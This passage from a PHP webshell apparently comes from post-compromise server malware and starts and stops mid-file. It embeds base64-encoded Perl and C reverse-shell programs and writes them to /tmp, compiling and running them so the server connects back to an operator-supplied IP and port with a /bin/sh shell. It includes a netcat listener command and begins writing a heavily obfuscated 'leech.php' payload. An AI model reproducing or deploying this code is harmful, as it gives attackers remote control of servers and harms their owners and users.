    $back_connect   = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGNtZD0gImx5bngiOw0KJHN5c3RlbT0gJ2VjaG8gImB1bmFtZSAtYWAiO2Vj" . "aG8gImBpZGAiOy9iaW4vc2gnOw0KJDA9JGNtZDsNCiR0YXJnZXQ9JEFSR1ZbMF07DQokcG9ydD0kQVJHVlsxXTsNCiRpYWRkcj1pbmV0X2F0b24oJHR" . "hcmdldCkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRwb3J0LCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKT" . "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoI" . "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQi" . "KTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgkc3lzdGVtKTsNCmNsb3NlKFNUREl" . "OKTsNCmNsb3NlKFNURE9VVCk7DQpjbG9zZShTVERFUlIpOw==";
    $back_connect_c = "I2luY2x1ZGUgPHN0ZGlvLmg+DQojaW5jbHVkZSA8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCmludC" . "BtYWluKGludCBhcmdjLCBjaGFyICphcmd2W10pDQp7DQogaW50IGZkOw0KIHN0cnVjdCBzb2NrYWRkcl9pbiBzaW47DQogY2hhciBybXNbMjFdPSJyb" . "SAtZiAiOyANCiBkYWVtb24oMSwwKTsNCiBzaW4uc2luX2ZhbWlseSA9IEFGX0lORVQ7DQogc2luLnNpbl9wb3J0ID0gaHRvbnMoYXRvaShhcmd2WzJd" . "KSk7DQogc2luLnNpbl9hZGRyLnNfYWRkciA9IGluZXRfYWRkcihhcmd2WzFdKTsgDQogYnplcm8oYXJndlsxXSxzdHJsZW4oYXJndlsxXSkrMStzdHJ" . "sZW4oYXJndlsyXSkpOyANCiBmZCA9IHNvY2tldChBRl9JTkVULCBTT0NLX1NUUkVBTSwgSVBQUk9UT19UQ1ApIDsgDQogaWYgKChjb25uZWN0KGZkLC" . "Aoc3RydWN0IHNvY2thZGRyICopICZzaW4sIHNpemVvZihzdHJ1Y3Qgc29ja2FkZHIpKSk8MCkgew0KICAgcGVycm9yKCJbLV0gY29ubmVjdCgpIik7D" . "QogICBleGl0KDApOw0KIH0NCiBzdHJjYXQocm1zLCBhcmd2WzBdKTsNCiBzeXN0ZW0ocm1zKTsgIA0KIGR1cDIoZmQsIDApOw0KIGR1cDIoZmQsIDEp" . "Ow0KIGR1cDIoZmQsIDIpOw0KIGV4ZWNsKCIvYmluL3NoIiwic2ggLWkiLCBOVUxMKTsNCiBjbG9zZShmZCk7IA0KfQ==";
    if ($start && $yourip && $yourport && $use) {
        if ($use == 'perl') {
            cf('/tmp/angel_bc', $back_connect);
            $res = execute(which('perl') . " /tmp/angel_bc $yourip $yourport &");
        } else {
            cf('/tmp/angel_bc.c', $back_connect_c);
            $res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');
            @unlink('/tmp/angel_bc.c');
            $res = execute("/tmp/angel_bc $yourip $yourport &");
        }
        m("Now script try connect to $yourip port $yourport ...");
    }
    formhead(array(
        'title' => 'Command : nc -vv -l -p 7777'
    ));
    makehide('action', 'backconnect');
    p('
');
    p('Your IP:');
    makeinput(array(
        'name' => 'yourip',
        'size' => 20,
        'value' => $yourip
    ));
    p('Your Port:');
    makeinput(array(
        'name' => 'yourport',
        'size' => 15,
        'value' => $yourport
    ));
    p('Use:');
    makeselect(array(
        'name' => 'use',
        'option' => $usedb,
        'selected' => $use
    ));
    makeinput(array(
        'name' => 'start',
        'value' => 'Start',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('

');
    formfoot();
} elseif ($action == 'leech') {
    $file       = fopen($dir . "leech.php", "w+");
    $perltoolss = 'PD9waHAgJGEgPSAnSUNSaElEMGdKMGxEVW1oSlJEQm5TakJ3U0ZKWFpGRlZNRVoxVld0YVIyUXlT
WGhqUm1oVFlsaFNhRll3Vm5Oa2JFNXhVV3M1YTJKVmNERldWekUwWVZkS2MxSnFRbUZTVjJoNldr
UkdkMVpYVGtWUmJVWllVakprTTFaRlVrdGlNREZJVTJ4b2EyVnRVa3RWYWtFeFpHeGtWMkZGZEd4
aVNFSmFWbFpTYzFZeFduTlRhMmhWVW14S2RWbHRkREJXVjAxM1RsVlNhV0Y2Vm5wWGExWmFUbFV4
U0ZKc2FFNVdNMmhhVkZjMWIyUXhiSE5hU0U1T1VsaFNSbFZXYUVOVlIxSTJVV3Q0VkdFeFdsQlph
a3BUVjFkS1NHVkhiR2hOVlhBelZsVmFhazFYU2toVmFsWlNZVEZLYjFVd1dscE5WbVJ6V1hwR1Ux
WXdXbFpaZWtFeFVrZEdWMU5ZWkZwV2JVNDBXV3RhYm1Wc1VuUlBWMFpYVFRKb05sVXhWbEprTVc5
M1lraENWRmRHV21oVmFrSmFaREZrYzFSdE5XaFdia0pGVkRGb1UxUlZNVmhrUnpWVlVtczFSRlV4
VlRWa1IwWTJWMjF3YkZaWGVETldSV1J6VTIxR1ZrOVVUazVTV0ZKTVZXcEtORTB4WkVWVWEzUnBV
akJ3V1ZReFVrTlpWbFYzVWxSV1ZGWlZOVlJYYlhoV1pERmFjMVJzWkdoTlZuQlZWbXBPYzFNeFZY
aFRiRnBPVm10S1dGVnNXbUZpVmxaWFZteE9VMVpzV25kVk1qRlRWVWRTTmxGcmVGUmhNbEpvV2xa
a1NtVlZNVmhYYlhCT1lsZG9lbGRYZEd0T1IwWjBVMWhzVm1KWWFFdFZhMUpEWW14T2NWUnJPV2xO
V0VKWldsVm9UMVZzUlhsVWFrWllZV3R3V0ZSVlpFZFRSVGxaWTBkMFUwMUhPSGhYVnpCNFVqSlNS
Mk5HVW1GTmJsSmFWRlpWTVZJeFdsaGxSMFpUWWtaYWVsbDZTVEZXYXpGSFYyeFNWMkpZVWxoV1ZF
WnVaREExVmxOc1ZsZFdiRm94VmpCYVQyTnRVbFpqUkZaYVpXMVNSbFpXWXpWamJIQkdXWHBXWVdK
SVFsbFVWbVJ2WVVaWmVscEhOVlpTYXpWRFdXMTRjMlJIVmtsWGJVWnNZVEowTTFkV1ZsZFJNa3Aw
VTJ4b1UySnJTbkJWV0hCWFkxWnNjVk5ZWkdsaGVtdDZWRlZXTUZNeFRrWk9XRTVhVFdwV2FGbHJa
RTlqTURsWlZXeHdWMDF1YURaVk1WWlNaREZ2ZDJKSVFsUlhSbHBvVkZkNFdtUXhiRlpaZWxac1ls
WktTVlV5Y0ZkaFYwcFdWMnBDV0dKRk5YVlpWRVp1WlVaU2NsZHNXbWxTYmtKSVZteGtOR1Z0U25O
V1dHUlhZa1UxV0ZsVVJtRldSbVJGVVZSR1VtSkdTbGRXYkdNeFYxWlZlV1JFUmxSV01uaERWMnBD
TkZaR1JsaGlSVEZvVm10d2RGWnNVa05XTVZWNFYyNUtWMkpGTlZsYVZtUlRVMnhhY2xkc1RsWldi
V1F6V1ZWYVExWnJNVmRTYmxaWVVtc3dkMWxXVm5OalYwMTNUbFZTYUZacmNEWlhWbHBxVFZkT2My
RXpjRlJXTWxKU1ZsUkNSMk5HV2taYVNFNXJWakJaTWxscVNtdFRiVVpWVlc1S1dGSkZXbEJWYlho
WFl6RmtjbGRzV21sVFJUVXhWbXhTUTFZeFZYaFhia3BYWWtVMVdsUlZVbGRSTVZwSFZteGFhV0pI
YUZWVWEyUnpVMjFHVlZWdVNsaFNSVnBRVlcxNFYyTXhaSEpYYkZwcFUwVTFNVlpzWkRCV01WWnpW
MnhhVjJKR1NsaFZiWEJ6VmpGYVdHUklTbWxpUjJoVlZHdGtjMU5zUmpaUmJUVldUVlp3UTFkcVJr
dFhWMFpJWTBkMFdGSnJjRE5YVnpCNFlXczFjbUpGVWxaaWEwcHhWVzF3YzA1V1pITlpNMmhyWWxa
S1NWWnNaR3RVVmxWM1UyeGFXbFp0VGpSWmExVTFZMFpHV0dSSGRGTk5ibWQzVmpKNFdrNVhWblJT
YTJoWFltczFjRlZVUW5KTk1VcEhVbTVhYUUxcldrbFdiVEZ2V1ZaSmVGZHFWbFJXVmtZelYycENj
Mk5zWkhWaVIyeE9ZV3RGZVZVeFZrOVZNa3BZVkc1U1VGZEdTbHBVVkVFeFpHeGtjMXBFVW1wTlYz
UTFWREZrTUZsV1duVmhSRlpZVWxkTmVGWlVSbmRYVmtaMVZHMTRWbVZyVmpOWFZ6VjNaR3h2ZDJO
RmFGaGliWGh3VkZkd1IySldiRFpUYlRscFVqQndTVnBWWkhkaFZURnpVMjVPVkZZelFqWldSM1JQ
WTJ4R2RWVnNjRmROYm1nMlZYcENUMVV3TVVoVFdHaFFWak5vY0ZacVFtRmtNV3h5VkdwT1lVMUlR
a3BXUnpFMFlXMUtjMk5JVGxwTmJtTXhXa1ZhYzFkSFNrbFVhekZTVFVWYWVWZFhkR3RqTWxKWVVs
aHNWV0p0ZUU1VlZFSkhZMnhzVmxwR1pHaFNia0pKVm0wMWMxUkdXa2xVYXpsU1RXMDRNRk42UWxO
VmJVbzJZVWRvVkZKcmIzZFhWM1JQVVRBMVNGTnNhR3hUUmxweFdsZHdRMk5HYkZaaFJrNU9VakEx
UmxscVRtRlVWVEI1VlZod1lWTkhjM2hVVkVGNFRsVTFXVmR0Y0dsV01EUjVWa1phVTJOck5WWlBW
bEpRVmtaS2IxVXdXa3ROUm14eVZHdHdZVTFzV2tsVVZtaFBWVWRLV1dGSE9WcGlWRVp4VkRGV2My
UkdXblZXYTNCb1ZsVndObFl4V21wTlYwcHpVV3hTVkdKWWFIQlpWbFp5WTJ4S1IxSnVXbEJTTVVw
SldXdFNRMkZXU1hoV1dFcFdVbFpGTVZwRVNrZFRWa1pZV2tkR1YwMUVWakpYVnpWelVXMUdWMWRZ
YkZkaVYzaHhWRmN4TTJReFpITlVhMHBQWVRKNFJWVXhhRmRUTVVweFlrWldWbUpHY0V4V2FrWkxW
akZPZEZOcmRFNVNNbWhYVm0xMFlWRXhjSE5VYTFwUVZteEtXRlZVU2xOaE1WSklZa1Z3YUZaVWF6
SlVNRTR3VTJ4T1NWcEhOVlpTVmtVeFdrUktSMU5XUmxoYVIwWlhUVVJXTWxkWE5YTlJiVVpYVkd4
a1VsWXlVbEZaVmxaSFkwWlNTRTFYZEdsU01VcEpXVlZvWVdGck1IaFRia0poVm0xTmVGbFZaRXRY
UmxwWVQxVjBVMkZ0ZUZaV1YzaGhVekZaZUZOc1pGUmlWWEJNVkZaVk1WSXhXbGhsUjBaVFlrWmFl
bFF4VlRWVmJGcFZVbXRrVkdGclZqTlpNRlkwWTBaT1dHSkdRbXhoYldSNVZURldVMDB5VW5SVmEy
aHBVa1ZLY0ZWcVJsWmpiRXBIVW01YVVGSXdNVFpXVjNCWFlWWkplRlpZU2xOU2Exb3lWVEl4UjFO
V1ZuVlZiV3hTVmtWS1RWVlVSbTlsYkZKeVZHMDFhRTFJUW5GVVYzTXhUbFpzY1ZOcVVtcE5WM2d3
VlcwMWMxUldaRWRUYWxaWVZtMVNVRmt5ZERSWFJsSjFWMjFzVTJWdGR6RldSRXB6VVcxR2NrMVZW
bEpYUjFKUFZXdFdSMDB4VVhwWk0yUlVUVVUxVTFscmFIZFhhekIzWTBSS1dtRXlVVEJaVmxwelYx
Wk9XVlZ0Um1sV1ZuQjRWako0VG1WSFJuUlRXR3hzVTBad2NWbFhNRFZpYkU1WlkwVkthMDFFUmta
VlZtaHJWR3hLU1ZSck9WSk5iVko1VlRJeFRtVldVblZpUjJ4T1ltMW9ObFl4WTNoU01sWldaVVpv
YUZORlNtaFVWekZ2Wld4c1YxcEhkR2xOYkVwRlZGWmtkMkZWTVhWaFJFcGFUVzVDTWxkcVFuTk9i
RVpaV2tVMVUxSlZXWHBXUmxaVFpXeFNjbFJ0TldoTlNFSnhWRmR6TVU1V2JIRlRhbEpxVFZkNE1G
VnROWE5VVmxsNFUyMDVXazFxUlhkYVZ6RkhVMFpLZEdSSGJFNU5helIzVmxaU1NrNVhUWGxUV0hC
VVZrWndTMVZVUVhoTk1WSldWV3RLYTAxRVJrWlZWbEpyVWxaV1dFOVZkRkpOVjJoUVdWY3hUMlJG
T1ZsVWJXeFRUVWhDZGxkVVNuSmtNbFp6WTBWb2JGTkZTbWhVVnpGdVpERlNSMXBGT1d0aVZYQkpW
REZvYzFWSFJsWk5WRTVWVmxaS1ExcEVRWGhTVmtaVldrVldWbFo2YkV4WGJYaEdaREZOZDFSc2FG
UmliSEJvVlRCa01GUXhSWGxhU0U1UFRVWktVMWxxUW5kU1JsbDRZMFJLV21KVVZsTmFSVnAzWkVa
S2RWVnRhRmROTW1ONFZrUktjMUV4V1hoalJteFVZbGhTWVZadWNGZGlNVkpHVkd0T1YxWnRlRmxa
VldoaFlWWlpkMVp1Y0ZSV1YyaFFXVlZrUzJSV1VsbFZiWEJPWWtadk1WZFdXbXRYYXpSM1ZXeEth
VTFJUWtWV2FrWjNUV3hzZEU1V1NtdFNNREUxV1d0U1lWbFdXa2hQVnpWVlZteEtURnBFU2xkU1Yw
MTNUbFZTWVUxdVl6RlZhMXBIWkd4T2MySkdTazVTV0ZKRlZqQm9UMVF4UlhsYVNFcFVZbFpLU1Za
dGNGTmhNVVkyVW01S1dHSkhVbEJhUnpGUFpFWktjVkZ0YUZkbGJYZDRWa1JLYzFFeVVsaFRXR3hQ
VmpOb1VWcEljRU5VUmtWNFdqTmtWV0V3TlhWWmEyaHJVbFpXV0U5VmRHRlhSMDR6VlhwQ1QxVnRT
a2xWYkhCWVVsaENNVmRXV21wTlJUVnlZa1ZXVkdKdFVuTlZhMmhQVkRGRmVWcElUbEJXVmtwVFdX
cENkMkV4U1hoU2F6bFNUVzFTZWxScVFsTlZiVWwzWTBWU1YwMUlRblpXTVZKTFRVZEtkRlJ1VWxC
V1JWcHdXV3hhUmsxc1RsWlVhemxwVm01Q01GWXlNSGhaVjBwWFlYcE9VMUpyV2pKVk1uUlBWMFpP
ZFZkdGNHbFdhM0I2VjFSS2QyUnNiM2ROVm14U1lXeEtTMVZ1Y0hKbFJuQkdZVVU1YVZJeFNrWlpl
a0V4VWtadmVXUjZWbE5TYTFveVZUSXhVMU5HVmxsV2JGWk9ZV3hLVUZWVVNtdGpNRFIzVld4S2FV
MUlRa1ZXYWtKM1RXeHJlVTFXVG1sU01EVjRXV3BLYTFSc1pFWlRWRUpVVmxkU2VscEdaRTVsVmxw
eFVXeENhMlZyU2sxVlZFWnVaREZTY2xSdE5XbFRSVXB3V1cxMFNtVkdjRVpTV0dSVVRVVTFXbGw2
UVRGU1JtOTVaRVYwV0ZaNlFURmFWbHAzVTBaYWRXSkdRbWhXVlZrd1YxUkNiMkpzYjNoalJXaFRZ
bTVDYjFWcVJtRmpiRTVXVkdzMVRrMVZjSGhaYTFaWFZXMUdkR042VGxOU2Exb3lWVEl4WVZWck1V
WmtSVkpXWld4YVVsWlVUbXBrTVUxM1ZHeHNhazFFVmtWWGFrb3dVekZrV0UxRVZteFdia0pKVm0w
MWMxVkhSbFpTYWxKYVRVZG9kVmRxU2twbGJGcHhVVzF3VG1KR2JETldSRTVxWkRGTmQxUnNTbWxT
TW5oaFZtcEJNV1ZXWkhGVWEzUnJZbFpLV1ZSc1pEQlZSMFpXVW01R1ZtSllRa2hWYWtGNFZteGtX
V0ZHUW10bGEwcE5WVlJHYm1ReFVuSlVia1pyVFRGd2NWUlVSa3BOVm14eVdrWmFURTFHU2xOWmJu
QnZWMjFLVldKSVNtRldhelZFV2tjeFMyTnRWa2xYYkhCWFRWVlZNVlV4WTNoak1sSllVbXhzVmxa
NmJFMVdWRUp6WW14c05sUnNUazlXTUhCSlZteFNjMU50U2xWU2JUbGFUV3BHY2xrd1pFdGpWMGw2
V2taQ1RrMVZjSFpXTVdONFRrZEtSbVZHYUd4U01taHpWbTV3Y21WR2NFWlZibVJwVmpCYVdsbFZa
RFJaVmtwSlZHMDFZVkpGYXpGYVZscDNVa1V4V0dKSGNHbFdiSEIyVjFab2QyUXlSbGhVYmxKWFls
ZG9iMXBXVWtkaU1XeHlXa1JPYUZaWGVFbFZNakF4VjJzeGNXSkljRnBoYXpWTFZERmFjMlJIVmto
aFJuQk9ZbXMxZFZZeFkzaFNNa1owVWxoc1lWTkhlSEJVVkVaaFRWWmtjbFZZYUdsTmJFcEtWbGMx
YTFWSFJsVmhSRXBhVm14S1IxcFZWWGhqVmxaWlZtMXdVMDF0WjNsWGExWnFUbGRHV0ZWc2FGVmlh
M0JvVmpCYVIwMVdaRlZUVkZaclVsaGtOVlZ0TlU5WGJVcHpWMnBDV2sweWN6Rlpla0V4Vmxac05s
SnJNVTVpVmtvelYydGplRkl3TlZaa00zQldZbFJzV2xSWGNFZGlNWEJHWVVWMGFsSXhXa1ZVYkdN
eFlVWlplR0V6U2xOU2Exb3lWREJrVDFKR1JuUmhSMnhUVFc1b01WZFhNWFprTWtaWFlUTnNWMkpz
V25KVmFrWmhUbFpPV0dKNlFsQlNiWGg0Vkd0U2IxbFhTbFZpUkVaaFVsVTFSRmxYTVVwbFYxWkpW
MjF3YUdGclNuZFZNVkpEV1ZaSmVGTnVTbGhoTWxKVVdWWldjMkpzYkRaVGJrNVBZa2hDVmxSVlpI
TlViVVpXWVROS1ZsSldSVEJXUjNSUFltc3hSbVJIY0U1TmJFb3pWMnRXYTFReVNYZGtSVkpXWWxa
d1ZGUlZXbUZXYkZsNllrZDBWV0pWYnpGWGEyUlRWRVpXVlZGcmVHRlhSMDR6VlhwQ1QxZEdVblJo
UjNCT1lrWmFkVlV5Y0VkVk1rbDVWV3hhVGxaRldtRmFWbVJPVFd4S1IxSnVXbFJoTURWVlZsY3hZ
VlpzU2xWaVJsWlhZVEZ3TmxsdGVGTlhSVGxJVGxac1YxSkZTakZXYlhScllqQXhWMVZzYkZkaVdF
Sk1XbGMxVDFReFJYbGFTRXBVWVROQ1NGUXhXa2RXVlRGV1RsWmFWMDB5ZUhKV2JHUkhVMVphY2s1
WGRGZE5SRVl4VmpCYVVtUXlSWGhhTTJSaFVsWndXRlZ0TlU5a1ZscHlXa2M1VGxac1NscFdiVEYz
VXpBeFZWRlVUbE5TYTFveVZUSjBUMWRHVG5WaVIwWlhUVVp3TlZaRVRtcGtNVTE1VjJ4S1RsSllV
a1pXVm1oRFRteHdSVk51VGs1U2JYUTFWMnBKTlZNeFNuRmlSa3BYVWtWYVVGWnNXbXRPVm5CR1Rs
ZHNiRll4U25KVmVrWkdaREZOZVZacVRrNVNXRkpGVm1wR1MyTXhaSFJOVldST1ZqQndTbFpXVW1G
VGJFWlZVV3Q0VWsxVldubFpWRVp1WlVaR2MxRnNXazVXYTNCd1ZUSndSMVV5U1hsVmJGcE9Wa1Zh
WVZwV1pGTmhNVlpIVkcxd2ExWllRVEpaZWtFeFVrWnZlV1JGZEZOU2Exb3lWVEo0Y21WV1NuVmpS
MFpXVFVWYU1WWnRkR3RpTURGWFZXeHNWMkpZUWt4YVZ6QTFZbXhLUjFKdVdsUmhNRFZUVkZWV01G
SkdWbGhrU0VwV1lUSlNTRnBHWkVkU01WSjBZVVp3VG1KWFRURlZNblJYVkRKSmVWVnNiR2xTTTJo
d1dWUkdTMlF4VWtkVlZFWlRWbTE0V1ZSc1l6VldhekZ5VjI1R1dsWlZOWFZaVkVadVpVWkdjMUZz
V2s1V2EzQndWVEp3UjFVeVNYbFZiRnBPVmtWYVlWcFdaRk5oTVUxNFZXNXdWV0V3TlhWWlZFSjNW
VmRXY1ZWck9WSk5ia0Y2V2tkNGQyUkZPVmxXYlhSVFVrWkZNRlpGVWt0VGEzTjRVV3RzVWxZeVVt
RldhazV2WkRGa2NWTlVRbEJXVjNnd1ZrY3hOR0ZYU25OVGJrNWFUVzE0UzFONlFuZGtSVFZZWWtk
d1RrMUZWWHBXVlZacldWZFNkRlJ1VWs1U01sSndWbXBHV21ReGJGWlplbFpvVFZWS1ZWVXlOV3Ro
VlRCM1RraGtWRll5ZUVSWlZWcHlaV3hXZFZGdGJFNWhiRVV4VlRGa2QwMHdkM2hSYkdoVVlsZG9j
VlJYZUdGTlZtUlhXVE5vYVZKWVVraFVNV1JoVlRKRmVXVkZOVlppUm1zeFYyMTBNRlpWT1VSa1JY
Qm9WbFZ2ZVZkWE1UUlVNREZYWWtoU1RsZEZTbkpWYTFKRFkwWndTRTFWWkd4V1YzaEhXa1ZrTkdF
eFNuSlhXR2hZVm14R00xbHRkSGRPYlZKRlUyeHdXRkpYZUhWV2JYUnJVakpTUjFGc2FGWmliSEJo
VkZSR1lVMUdaSE5aZWtaT1VsaG9NRmRyWkRSaE1VcFhWMjV3V0dKSFRqUlphMlJMWkZaV2RXTkdT
bWxpV0doUlZqRmFhbVZIU2taa1JWSmhVbFJHY2xacVFtRlNWbXhXV1hwV2ExWllRVEZaV0hCcldW
ZEtWV0pFVmxSTlIxSjVWREZWZUZKWFVrbFJiRVpUWWtWd2RsZFhlRTVOVjAxNFkwWm9UMVo2Vm5K
VmFrcHFUVEZzVjFSdWNHcGhNMUphV2tWb1ExbFhSbGhoUmxwWVZtMU9ORmRYTVVkV01ERkpWbXh3
VG1KWGFIcFdNVkpMVFVkS1IyTkZVbWxTUjFKVlZGZDRXbVF4V2xkaFJtUm9VbGhSTWxSV1dsZFhi
Rm8yVW0xc1dsWnNiRE5hUm1SVFpFWktkVlJ0ZEZkTlZsbzFWVEkxZDJWdFNuUlhiR3hPVmtWS2Ix
VnFTalJPYkZKSVpVWk9hRkl3TlVoV1Z6VkRZVmRHVlZaWWJGaFdiVkV3VkZaYWQxWlZNVlpsUjBa
WVVtdHdWRmRyV210U2F6UjVVbXhvV0ZaNmJFdFdha0V4VFd4c2RFMVhSbXBTTURVd1ZGVmpOVk13
TVZoYVNGSlVWMGhDUzFwV1ZURldWMUpJWTBWd1UyVnNXakpWTWpGelZHc3dkMDlWVmxkWFNFSlJW
RmR3VTJKc1pGVlRiVGxPVmpGYVZWWXhaSGRVTWxaMFdUTndWV0pHU1hkYVJsWjNUbGRGZWxGdGVF
NU5TRUo2VjJ0V2IxWXlWbGhUYmtKU1lsUkdZVlpxVG05T2JHUnpXak5rYUZaWGVFcFdWekZ2WVcx
S1dGVnVUbUZTVmtZeldWWmFibVZXVG5WVWJIQlhaV3hhTlZVeFpIWk5SbEp5VkcwMWFFMUlRbEpW
YWtaM1RXeHNkRTVXU21GTlYzUTFWREZvVDJGVk1IZGhlbFpVVmtWd2FGbHNXbmRrUm1SMFRWZEdh
R0ZzV2taWFZsWnZWakExVm1OSVFsVldSVFZSVld0a1RtVkdValpUVkVKaFRVaENkMVpHYUhOVU1s
WnlUVVJPVkdKWGVFOVVWRUUxVWxacmVtRkdRazVoYkVWNVZsVldUazVYU2xoVFdHeFBWa1ZLVWxs
V1ZrWk9SbXhYV1hwR2EwMXNTbHBXVm1ScllURk9TR1ZFVGxoaVJrWXpXVlprVTFOR1duRlZiWFJT
VFVkNGRWZFhNSGhTTWxKSFkwWldUbEl5ZUZSVmFrWmhUVlphY2xwSE9VNVdiRXBhVm0weGQxTnRS
bFpUYWxwYVZtMW9NMWxyV2tOV1JrNVpZVVUxVWsxSGVIVlhhMk40VWpKTmVWVnNhRmRXUjNoTFdW
WlNjMDB4Y0VkYVJYUnFUV3RhV1ZaSE1XRmhSazVIVTJwQ1dtRXdOVXRYYWtJMFRtczFSazVWVW1G
TmJsSk1WbFZXYTJNeVVsaFVhMnhYWVd0S1MxVXdXa3BOVm10M1drWmFVRlpYZURCWlZXaERXVlpK
ZUZOdVRscGlWM2hMVjJwS1MyUkdTblZWYlVaWFVrVktkMVpyV21wT1IwWldZa1ZzV0dKWGFIQlZN
RnBoWXpGV1IxUnJkRk5TTUZwS1ZtMXdWMWxXV2paV2ExcGFWbXMxUzFkcVFqUk9helZHVGxWU1lV
MXVVa3hXVlZacll6SlNXRlJyYkZkaGEwcExWVEJhU2sxV2EzZGFSbHBRVmxkNE1GbFZhRU5aVmts
NFUyNU9XbUpYZUV0WGFrcExaRVpLZFZWdFJsZFNSVXAzVm0xMGExSXlVWGhYYTJocFUwWmFTMWxX
VmtkTmJGWklXVE5rVkUxRk5WTlpXSEJ2WVVaYU5sWnFUbUZTYldoVFYycEtVMU5YU2tsYVIwWlhV
a1ZLZDFkV1ZtdGpNa1Y0WTBWb1YySnNXa3RaVmxaTFRWWmtWMWt6YUdsU2EwcFZWVEo0VjJFeFdu
TlRibHBoVW14V05GUldXbk5PVms1WVdrZDBhVlpXY0RaWGExcHJWbXM1Vm1KSVJtdGxWR3hTVmxS
R1MySldXbFpXVkZaWFVteHdTRmw2U1RGV01VbDVXak5vVjFKdGFGaFpWM1IyWlVVeFJFOVdSbWhX
VjNoMVZrVm9kazFHVW5KVWJUVm9UVWhDVWxWcVJuZE5iR3gwVGxaS1lVMVhkRFZVTVdoUFlWVXdk
MkY2VmxSV1JYQm9XV3hhZDJSR1pIUk5WMFpvWVd4YVVGVXlNWE5VYlZaV1RWaEdWMVpIVW5OV1ZF
SkxZMVpzVmxSc2NHaGhlbFV5V1ZST2IxUnNXa2xVVkVwV1VsVXdNVmxzWkVwbFZUVlZVV3hHYUZa
VlZUQlhWbHBxVFZkUmVWVnNiRlpXTWxKeVZUQmtORTB4WkhOVldHUm9WakZLU1ZadGNGTmhNVVYz
WWtjMVdtSlVSa2hhUlZwM1ZsVXhTR0pHVGxOTmJtaDJWbFpTUzJJeVRrWmlTRUpTWW01Q2IxWXdh
RU5qTVZaSFZHdHdiRkpVUmtWVk1XUnJZVEpLVmxkdWNHRlNiVkpYVkRGV2MyTlhValZQVmtaV1RW
VndkRlpzVWtOV01WcEhWbGhrYVZKclNsWlphMmhQWkZaV2NscElUbWhTYTFZMVdWVm9RMU13TVZW
UldGcFdVako0UzFkcVFqUk9helZHVGxWU1lVMXVVa3hXVlZacldWZFNkRk51VmxaV01sSmhWRmR3
YzJWc2JIRlVhM0JRVmxkME5WWXlNSGhaVjBwWFkwaFNXR0pYT0hoV2JGWjNZMFpTV1dKRk5XeGlS
VlY2VjFjeGMxRnRTbFppUkZwVVZrVTFUMXBYTlU5a1JrNVpZMFZ3VGxaVWJGWmFSV2hYVTJ4S05s
WnVXbFJpVjNoUFZGUkJOVkpXV2xsalJrSk9UVVZWZVZaVlZrNU9WMHBZVTFoc1QxWkZTbEpaVmxa
R1RrWnNWMWw2Um10TmJFcGFWbFprYTJFeFRraGxSRTVZWWtaR00xbFdaRk5UUmxweFZXMTBVazFI
ZUhWWFZ6QjRVakpTUjJOR1ZrNVNNbmhZVldwR1lVMVdWbkphUldSclZtMDVNMVJzWXpWWGJHUkdV
bTVDVkZaWGFGQlpNR1JYWkVaYVZXSkZjR2hoTVZZMFZURmtjMUV3TVhOaVJtaHNVa1ZhYUZaclVr
TmpSbFpHVlZSU1VGWllRa2hVTVZwVFZURmFjazVXVmxaTlZsVXhWa1JHYTA1V2NFZFdiVVpYWld4
YVIxWXhXbXBOVjBwelZXNVNhRkl5YUhGVlZFcFRZVEZXU1dKNlFtaFdWM2hGVkRCT01GSldWbGhQ
VlhSU1RWWkpNRmxzWkVwbFZUVlZVV3R3VTAxRVZYbFhWM1JxVGxkV1YxRnNVbFZpVkVab1dXeGFk
MlJHWkhSTlZuQk1UVlpLVlZZeFpIZFVNbFowV1ROb1ZWZElRWGRVVlZaelUwZFNTRTlWZEdoV1ZF
STJWa1JDVTFWck5WWlBTSEJYVmtad1VsVlljSE5rUm14eFUxUkdUbEpyU25kVlZsSnZZVVphTmxa
cVRtRlNiV2hUVjJwS1UxTlhTa2xhUjBaWFVrVktkMWRVUW10U01sWjBWRmh3WVZOR2NIRlpiRnBI
WTBaT1ZsbDZSbWhTTUhCWlZteFNjMU50UmpaU2JUbGhVbFpaZDFscVJuTlhWbHBZWWtWd1ZGSlVW
ak5YYkdONFZtczVWbUpJUmxOWFIxSkxXVlpXU21WV1pGZGFSRkpPVm01Q1ZsUlZaSE5WVmtwRldu
cFdWR0V4YXpGV2ExcExWakZTYzFWc1VsZFdSM2hSVm1wT2MyRXhVbk5pUm14V1lUTm9iMVZxUWxw
bFJrNXhVbGhrVFUxVlNuZFZNV1JyVkZkV2NWVnJPVkpOYlU0elZYcENUMVZ0UmpaaFIyaFhaV3ha
ZWxkcldtOVZiRzk0WVROc2JGSXlhSEZVVkVGM1RsWk9XR042VmxWU1YzaDNWVmR3UTJKR1pFWlRi
azVXVW1zMVRGcFhNVk5YUms1MVZXMW9XRkpyV25kVk1WWnZXVmRHU0ZOcmJGZGlXR2hTVmxSQ2Qy
RkdWWGhYYTBwb1ZsZDRSVlF3VGpCVlZrWTJZa2hTV21GcmEzaFVWVnBEWW1zeFJtUkZVbGRUUjFG
NVZqSXdkMDVYVmxoVGJGWlBVbFJXUlZkcVNucE9SbVJ5V2toT1RtRXllRXBXUjNCRFlrWlplbUZJ
VGxaU2F6Vk1WRlJLUjFkR1ZuRlJiV2hUVW5wck1GWkdWbE5SYlVwR1QwaHNhRkl6YUc5V2FrcFRa
R3h3UmxWdVdteFNWRVpHVlZaa05GVkZNWFJoU0U1YVZtMVNjbGxxU2xOU1YwNUlaVWQ0VkZKVmJ6
